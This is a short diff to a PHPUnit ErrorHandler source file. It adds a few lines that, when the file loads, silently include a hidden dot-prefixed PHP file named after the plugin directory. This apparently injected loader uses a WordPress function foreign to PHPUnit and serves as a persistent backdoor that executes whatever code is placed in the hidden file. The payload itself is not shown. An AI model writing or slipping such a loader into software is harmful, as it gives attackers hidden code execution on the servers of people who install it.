@@ -21,6 +21,10 @@ require_once dirname(__DIR__) . '/Framework/Error/Deprecated.php';
  *
  * @since Class available since Release 3.3.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class PHPUnit_Util_ErrorHandler
 {
     protected static $errorStack = array();
